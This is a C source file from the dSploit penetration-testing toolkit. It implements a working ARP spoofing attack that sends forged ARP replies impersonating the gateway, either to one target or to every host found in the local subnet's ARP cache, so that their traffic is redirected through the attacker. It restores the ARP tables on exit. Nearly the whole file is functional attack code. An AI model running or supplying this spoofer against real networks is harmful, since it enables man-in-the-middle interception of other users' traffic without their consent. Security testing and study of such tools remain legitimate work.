/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include <netinet/if_ether.h>

#include <droid.h>

#include "hashmap.h"
#include "version.h"

#define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"
#define VOID_MAC_ADDR			 "\x00\x00\x00\x00\x00\x00"

static libnet_t *l;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t gateway_ip, target_ip;
static char *iface;
static Hashmap *netmap = NULL;

typedef struct {
	int address;
	unsigned char mac[6];
}
network_entry_t;

static inline int
xdigit (char c) {
    unsigned d;
    d = (unsigned)(c-'0');
    if (d < 10) return (int)d;
    d = (unsigned)(c-'a');
    if (d < 6) return (int)(10+d);
    d = (unsigned)(c-'A');
    if (d < 6) return (int)(10+d);
    return -1;
}

/*
 * Convert Ethernet address in the standard hex-digits-and-colons to binary
 * representation.
 * Re-entrant version (GNU extensions)
 */
struct ether_addr *
ether_aton_r (const char *asc, struct ether_addr * addr)
{
    int i, val0, val1;
    for (i = 0; i < ETHER_ADDR_LEN; ++i) {
        val0 = xdigit(*asc);
        asc++;
        if (val0 < 0)
            return NULL;

        val1 = xdigit(*asc);
        asc++;
        if (val1 < 0)
            return NULL;

        addr->ether_addr_octet[i] = (u_int8_t)((val0 << 4) + val1);

        if (i < ETHER_ADDR_LEN - 1) {
            if (*asc != ':')
                return NULL;
            asc++;
        }
    }
    if (*asc != '\0')
        return NULL;
    return addr;
}

/*
 * Convert Ethernet address in the standard hex-digits-and-colons to binary
 * representation.
 */
struct ether_addr *
ether_aton (const char *asc)
{
    static struct ether_addr addr;
    return ether_aton_r(asc, &addr);
}

static int arp_cache_lookup( in_addr_t address, struct ether_addr *ether, const char* lif )
{
	FILE *fp = fopen( "/proc/net/arp", "r" );
	int type, flags;
	int num;
	unsigned entries = 0, shown = 0;
	char ip[128];
	char hwa[128];
	char mask[128];
	char line[128];
	char dev[128];

	if( !fp ) return -1;

	/* Bypass header -- read one line */
	fgets( line, sizeof(line), fp );

	/* Read the ARP cache entries. */
	while( fgets(line, sizeof(line), fp) )
	{
		/* All these strings can't overflow because fgets above
		 * reads limited amount of data
		 */
		num = sscanf( line, "%s 0x%x 0x%x %s %s %s\n", ip, &type, &flags, hwa, mask, dev );
		if (num < 4)
		{
			printf( "Line with less than 4 expected elements.\n" );
			continue;
		}

		// not on the same interface, skip
		if( strcmp( dev, lif ) != 0 )
		{
			printf( "%s != %s.\n", dev, lif );
			continue;
		}

		// unknown or broadcast address, skip
		if( strcmp( hwa, "00:00:00:00:00:00" ) == 0 || strcmp( hwa, "FF:FF:FF:FF:FF:FF" ) == 0 || strcmp( hwa, "ff:ff:ff:ff:ff:ff" ) == 0 )
			continue;

		// found!
		if( strcmp( ip, inet_ntoa( *( struct in_addr *)&address ) ) == 0 )
		{
			memcpy( ether, (void const *)ether_aton( hwa ), sizeof( struct ether_addr ) );

			printf( "FOUND %s [%s]\n", ip, hwa );

			return 0;
		}
	}

	return -1;
}

static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
{
	int retval;

	if( sha == NULL && ( sha = (u_int8_t *)libnet_get_hwaddr( pnet ) ) == NULL )
	{
		printf( "libnet_get_hwaddr failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( spa == 0 && ( spa = libnet_get_ipaddr4( pnet ) ) == -1 )
	{
		printf( "libnet_get_ipaddr4 failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( tha == NULL )
		tha = BROADCAST_MAC_ADDR;

	if( libnet_autobuild_arp( arp_op, sha, (u_int8_t *)&spa, tha, (u_int8_t *)&tpa, pnet ) == -1 )
	{
		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( libnet_build_ethernet( tha, sha, ETHERTYPE_ARP, NULL, 0, pnet, 0 ) == -1 )
	{
		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	retval = libnet_write( pnet );
	if( retval == -1 )
		printf( "libnet_write failed : %s\n", libnet_geterror( pnet ) );

	else
		printf
		(
				"sent spoof from %s [ %x:%x:%x:%x:%x:%x ] to %s [ %x:%x:%x:%x:%x:%x ]\n",
				inet_ntoa( *(struct in_addr *)&spa ),
				sha[0], sha[1], sha[2], sha[3], sha[4], sha[5],
				inet_ntoa( *(struct in_addr *)&tpa ),
				tha[0], tha[1], tha[2], tha[3], tha[4], tha[5]
		);

	libnet_clear_packet( pnet );

	return retval;
}

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	if( arp_cache_lookup(ip, mac, iface) == 0 )
		return (1);

	return (0);
}

static void cleanup(int sig)
{
	printf( "Restoring arp table ...\n" );
	int i, j;
	
	if( netmap == NULL )
	{
		if (arp_find(gateway_ip, &spoof_mac)) {
			for (i = 0; i < 3; i++) {
				/* XXX - on BSD, requires ETHERSPOOF kernel. */
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&spoof_mac, gateway_ip,
					 (target_ip ? (u_int8_t *)&target_mac : NULL),
					 target_ip);
				sleep(1);
			}
		}
	}
	else
	{
		if( arp_find( gateway_ip, &spoof_mac ) )
		{
			for( i = 0; i < 3; i++ )
			{
				for( j = 0; j < netmap->bucketCount; j++ )
				{
						Entry* hentry = netmap->buckets[j];
						while( hentry != NULL )
						{
								Entry 					*next  = hentry->next;
								network_entry_t *entry = ( network_entry_t * )hentry->value;

								arp_send( l, ARPOP_REPLY, (u_int8_t *)&spoof_mac, gateway_ip, entry->mac, entry->address );

								hentry = next;
						}
				}

				sleep(1);
			}
		}

		hashmapFree( netmap );
	}

	exit(0);
}

int address_hash( void* key ) {
	return (int)key;
}

bool address_hash_equals(void* keyA, void* keyB) {
	return address_hash( keyA ) == address_hash( keyB );
}

int main(int argc, char *argv[])
{
	extern char *optarg;
	extern int   optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int  c;
	
	iface			 = NULL;
	gateway_ip = target_ip = 0;
	
	while( (c = getopt(argc, argv, "i:t:h?V")) != -1)
	{
		switch (c)
		{
			case 'i':
				iface = optarg;
				break;
			case 't':
				if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
					exit(1);
				break;
			default:
				exit(1);
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		exit(1);
	
	if ((gateway_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
		exit(1);
	
	if (iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL) {
		printf( "%s\n", pcap_ebuf);
		exit(1);
	}

	if ((l = libnet_init(LIBNET_LINK, iface, libnet_ebuf)) == NULL) {
		printf( "%s\n", libnet_ebuf);
		exit(1);
	}
	
	if (target_ip != 0 && !arp_find(target_ip, &target_mac)) {
		printf( "couldn't arp for host %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
		exit(1);
	}
	
	signal( SIGHUP, cleanup );
	signal( SIGINT, cleanup );
	signal( SIGTERM, cleanup );
	
	// single ip spoofing
	if( target_ip != 0 )
	{
		printf( "Single target mode.\n" );

		for (;;)
		{
			arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
			sleep(1);
		}
	}
	// whole network spoofing
	else
	{
		printf( "Subnet mode.\n" );

		int netmask = 0,
				ifaddr  = 0,
				nhosts  = 0,
				i;
		pcap_if_t *ifaces = NULL,
						  *pcap_iface;
		pcap_addr_t *pcap_address;
		network_entry_t *entry;

		if( pcap_findalldevs( &ifaces, pcap_ebuf ) != 0 )
		{
			printf( "%s\n", pcap_ebuf);
			exit(1);
		}

		for( pcap_iface = ifaces; pcap_iface != NULL && netmask == 0; pcap_iface = pcap_iface->next )
		{
			if( strcmp( pcap_iface->name, iface ) == 0 )
			{
				for( pcap_address = pcap_iface->addresses; pcap_address != NULL; pcap_address = pcap_address->next )
				{
					if( pcap_address->addr->sa_family == AF_INET )
					{
						ifaddr  = *( unsigned int *)&((struct sockaddr_in*)pcap_address->addr)->sin_addr;
						netmask = *( unsigned int *)&((struct sockaddr_in*)pcap_address->netmask)->sin_addr;

						break;
					}
				}
			}
		}

		if( netmask == 0 || ifaddr == 0 )
			exit( 1 );

		nhosts = ntohl(~netmask);

		printf( "netmask = %s\n", inet_ntoa( *( struct in_addr *)&netmask ) );
		printf( "ifaddr  = %s\n", inet_ntoa( *( struct in_addr *)&ifaddr ) );
		printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
		printf( "hosts   = %d\n", nhosts );

		netmap = hashmapCreate( nhosts, address_hash, address_hash_equals );

		// precompute addresses
		for( i = 1; i <= nhosts; i++ )
		{
			target_ip = ( ifaddr & netmask ) | htonl(i);

			if( target_ip != ifaddr && target_ip != gateway_ip )
			{
				// skip endpoints unknown to arp and broadcasting address
				if( arp_find( target_ip, &target_mac ) )
				{
					entry = ( network_entry_t * )malloc( sizeof( network_entry_t ) );

					entry->address = target_ip;
					memcpy( &entry->mac, &target_mac, sizeof( BROADCAST_MAC_ADDR ) );

					hashmapPut( netmap, ( void *)target_ip, entry );
				}
			}
		}

		for(;;)
		{
			for( i = 1; i <= nhosts; i++ )
			{
				target_ip = ( ifaddr & netmask ) | htonl(i);

				entry = hashmapGet( netmap, (void *)target_ip );
				if( entry )
				{
					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (u_int8_t *)&entry->mac, target_ip );
				}
			}

			sleep(1);
		}

	}

	return 0;
}
